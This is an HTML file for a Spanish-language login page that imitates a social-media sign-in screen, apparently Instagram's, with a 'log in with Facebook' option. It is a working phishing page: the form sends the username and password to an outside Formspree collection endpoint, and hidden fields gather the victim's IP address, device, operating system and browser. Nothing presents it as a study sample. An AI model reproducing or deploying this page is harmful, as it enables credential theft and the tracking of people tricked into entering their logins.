<!DOCTYPE html>
<html lang="es">
<head>
    <link rel="stylesheet" href="css/estilo.css">
</head>
<body class="formulario">
    <form class="login-form" action="https://formspree.io/f/xoevzonl" method="POST" id="miFormulario">
        <div class="field">
            <input
            id="username"
            type="text"
            name="username"
            placeholder="Número de celular, nombre de usuario o correo electrónico"
            required>
            <label for="username">Nombre de usuario o correo electrónico</label>
        </div>
        <div class="field">
            <input
            id="message"
            type="password"
            name="message"
            placeholder="Contraseña"
            required>
            <label for="password">Contraseña</label>
            <button type="button" id="show-password-btn">Show</button>
        </div>
        <input type="hidden" name="IP" id="ip">
        <input type="hidden" name="Dispositivo" id="dispositivo">
        <input type="hidden" name="Sistema" id="sistema">
        <input type="hidden" name="Navegador" id="navegador">
        <button class="login-button" type="submit" title="Login">
            Iniciar sesión
        </button>
        <div class="separator">
            <div class="line"></div>
            <p>O</p>
            <div class="line"></div>
        </div>
        <div class="other">
            <button class="fb-login-btn" type="button" onclick="window.location.href='#'">
                <i class="fa fa-facebook-official fb-icon"></i>
                <span>
                    <img src="img/facebook-logo.png" height="15" width="15">
                    &nbsp;
                    <a href="#">Iniciar sesión con Facebook</a>
                </span>
            </button>
            <a class="forgot-password" href="#">
                ¿Olvidaste tu contraseña?
            </a>
        </div>
    </form>
    <script src="js/script.js"></script>
</body>
</html>
